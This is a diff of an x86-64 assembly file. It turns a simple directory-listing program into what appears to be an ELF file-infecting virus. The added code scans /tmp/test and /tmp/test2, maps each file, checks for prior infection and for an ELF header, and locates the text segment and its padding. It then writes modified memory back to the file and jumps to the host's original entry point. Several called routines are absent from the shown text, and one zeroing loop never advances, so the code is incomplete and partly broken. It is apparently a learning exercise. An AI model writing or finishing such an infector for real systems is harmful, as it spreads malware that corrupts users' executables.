@@ -1,172 +1,185 @@
-				global		main
-				extern		printf
+				extern			sc_get_full_path
+				extern			sc_map_file
+sc:
+				push			rbp
+				mov				rbp,				rsp
 
-fmt_s:
-				db			"%s", 10, 0
-fmt_ld:
-				db			"%ld", 10, 0
-print_s:
-				lea			rdi,				[rel fmt_s]
-				jmp			print
-print_ld:
-				lea			rdi,				[rel fmt_ld]
-				jmp			print
-print:
-				call		printf
-				ret
+				mov				rbx,				11 * 8 + 3 * 1024
+				sub				rsp,				rbx
+				mov				qword[sc_glob],		rsp
 
+				push			rdi
+				push			rsi
+				push			rdx
 
-main:
-				push		rdi
-				push		rsi
-				push		rdx
-
-				sub			rsp,				2048				; path_buff @ 1064
-				sub			rsp,				40					; dir_buff @ 40
-																	; test2 @ 24
-																	; rdir_ret @ 16
-																	; ent_off @ 8
-																	; fd @ 0
-
-				mov			qword[rsp+24],		0
-				lea			rdi,				[rel test]
-.read_dir_loop:
-				mov			rsi,				qword[rel dir_o_flags]
-				mov			rax,				2 ; open
-				syscall
-
-				mov			qword[rsp],			rax
-
-				cmp			rax,				0
-				jle			.end
-
-				mov			rdi,				qword[rsp]
-				lea			rsi,				[rsp+40]
-				mov			rdx,				1024
-				mov			rax,				78 ; getdents
-				syscall
-
-				cmp			rax,				0
-				jle			.read_dir_end
-
-				mov			qword[rsp+16],		rax
-
-				mov			qword[rsp+8], 		0
-.entry_loop:
-				mov			rbx,				qword[rsp+16]
-				cmp			qword[rsp+8],		rbx
-				je			.read_dir_end
-
-				lea			rcx,				[rsp+40]
-				add			rcx,				qword[rsp+8]
-
-				lea			rdi,				[rcx+18]
-				lea			rsi,				[rel curent_dir]
-				call		str_cmp
-
-				cmp			rax,				0
-				je			.after_print
-
-				lea			rdi,				[rcx+18]
-				lea			rsi,				[rel parent_dir]
-				call		str_cmp
-
-				cmp			rax,				0
-				je			.after_print
-
-				mov			rax,				rcx
-				xor			rbx,				rbx
-				mov			bx,					word[rcx+16]
-				add			rax,				rbx
-				dec			rax
-				cmp			byte[rax],			8					; DT_REG
-				jne			.after_print
-
-				lea			rsi,				[rcx+18]
-				call		print_s
-.after_print:
-				lea			rcx,				[rsp+40]
-				add			rcx,				qword[rsp+8]
-
-				xor			rsi,				rsi
-				mov			si,					word[rcx+16]
-				add			qword[rsp+8],		rsi
-
-				jmp			.entry_loop
-.read_dir_end:
-				mov			rdi,				qword[rsp]
-				mov			rax,				3
-				syscall
-
-				cmp			qword[rsp+24],		1
-				je			.end
-
-				inc			qword[rsp+24]
-
-				lea			rdi,				[rel test2]
-				jmp			.read_dir_loop
-.end:
-				add			rsp,				40
-				add			rsp,				2048
-
-				pop			rdx
-				pop			rsi
-				pop			rdi
-
-				xor			rax,				rax
-				ret
-str_cmp:
-				xor			rax,				rax
+				xor				rcx,				rcx
 .loop:
-				mov			al,					byte[rdi]
-				cmp			al,					0
-				je			.end
+				cmp				rcx,				rbx
+				je				.loop_end
 
-				cmp			al,					byte[rsi]
-				jne			.end
+				mov				byte[rsp+rcx],		0
+				jmp				.loop
+.loop_end:
+				lea				rdi,				[sc_dir_1]
+				call			sc_proc_dir
 
-				inc			rdi
-				inc			rsi
-				jmp			.loop
+				lea				rdi,				[sc_dir_2]
+				call			sc_proc_dir
+
+				pop				rdx
+				pop				rsi
+				pop				rdi
+
+				mov				rsp,				rbp
+				pop				rbp
+
+				jmp				qword[rel sc_old_entry]
+sc_proc_dir:
+				push			rbp
+				mov				rbp,				rsp
+
+				sub				rsp,				8	; +8 dir_fd
+				push			rdi						; +0 *dir
+
+				mov				rsi,				0x10000
+				mov				rax,				2
+				syscall
+
+				cmp				rax,				0
+				jl				.end
+
+				mov				qword[rsp+8],		rax
+.loop:
+				mov				rdi,				qword[rsp+8]
+				mov				rsi,				qword[sc_glob]
+				add				rsi,				0x860
+				mov				rdx,				0x400
+				mov				rax,				78
+				syscall
+
+				cmp				rax, 				0
+				jle				.close_end
+
+				mov				rdi,				rax
+				mov				rsi,				qword[rsp]
+				call			sc_proc_entries
+
+				jmp				.loop
+.close_end:
+				mov				rdi,				qword[rsp+8]
+				mov				rax,				3
+				syscall
 .end:
-				sub			al,					byte[rsi]
+				mov				rsp,				rbp
+				pop				rbp
 				ret
-concat_path:
-				lea			rax,				[rsp+1064]
-.loop_1:
-				mov			bl,					byte[rdi]
-				cmp			bl,					0
-				je			.loop_2
+sc_proc_entries:
+				push			rbp
+				mov				rbp,				rsp
 
-				mov			byte[rax],			bl
-				inc			rdi
-				inc			rax
-				jmp			.loop_1
-.loop_2:
-				mov			bl,					byte[rsi]
-				cmp			bl,					0
-				je			.end
+				sub				rsp,				8		; +16 ent_ptr
+				push			rdi							; +8 dir_ret
+				push			rsi							; +0 root_path
 
-				mov			byte[rax],			bl
-				inc			rdi
-				inc			rax
-				jmp			.loop_2
-.end:
-				ret
-main_end:
+				mov				qword[rsp+24],		0
+
+				mov				rdx,				qword[sc_glob]
+				add				rdx,				0x860
+				mov				qword[rsp+16],		rdx
+.loop:
+				cmp				qword[rsp+8],		0	
+				je				.end
 				
-data:
-dir_o_flags:
-				dq			0x10000
-test:
-				db			"/tmp/test", 0
-test2:
-				db			"/tmp/test2", 0
-curent_dir:
-				db			".", 0
-parent_dir:
-				db			"..", 0
-hello:
-				db			"Hello World !", 10
-hello_end:
-data_end:
+				mov				rdi,				qword[rsp]
+				mov				rsi,				qword[rsp+16]
+				add				rsi,				18
+				mov				rdx,				qword[sc_glob]
+				add				rdx,				0x60
+				call			sc_get_full_path
+
+				mov				rdi,				qword[sc_glob]
+				add				rdi,				0x60
+				call			sc_map_file
+
+				cmp				rax,				0
+				jl				.inc
+
+				mov				rbx,				qword[sc_glob]
+				mov				rdx,				rbx
+				add				rbx,				0x48
+				add				rdx,				0xc60
+				mov				rdx,				qword[rdx]
+				mov				qword[rbx],			rdx
+
+				call			sc_check_infection
+				cmp				rax,				0
+				jl				.unmap
+
+				call			sc_test_elf_hdr
+				cmp				rax,				0
+				jl				.unmap
+
+				call			sc_find_txt_seg
+				cmp				rax,				0
+				jl				.unmap
+
+				call			sc_set_x_pad
+				cmp				rax,				0
+				jl				.unmap
+
+				call			sc_update_mem
+				cmp				rax,				0
+				jl				.unmap
+
+				mov				rdi,				qword[sc_glob]
+				add				rdi,				0x60
+				call			sc_write_mem
+.unmap:
+				mov				rdi,				qword[sc_glob]
+				mov				rsi,				rdi
+				add				rdi,				0xc60
+				mov				rsi,				qword[rsi+0x18]
+				mov				rax,				11
+				syscall
+.inc:
+				mov				rdx,				qword[rsp+16]
+				xor				rbx,				rbx
+				mov				bx,					word[rdx+16]
+
+				sub				qword[rsp+8],		bx
+				add				qword[rsp+16],		bx
+				jmp				.loop
+.end:
+				mov				rsp,				rbp
+				pop				rbp
+				ret
+sc_end:
+
+sc_data:
+sc_dir_1:
+				db				"/tmp/test/", 0
+sc_dir_2:
+				db				"/tmp/test2/", 0
+sc_entry:
+				dq				sc
+sc_old_entry:
+				dq				sc_end
+sc_glob:
+				dq				0	; +0x18 -> sz.mem
+									; +0x20 -> sz.code
+									; +0x28 -> sz.data
+									; +0x30 -> sz.load
+									; +0x38 -> sz.f_pad
+									; +0x40 -> sz.m_pad
+
+									; +0x48 -> *hdrs.elf
+									; +0x50 -> *hdrs.txt
+									; +0x58 -> *hdrs.nxt
+									
+									; +0x60 -> buffs.path
+									; +0x460 -> buffs.zeros
+									; +0x860 -> buffs.entry
+
+									; +0xc60 -> mem
+									; +0xc68 -> x_pad
+sc_data_end:
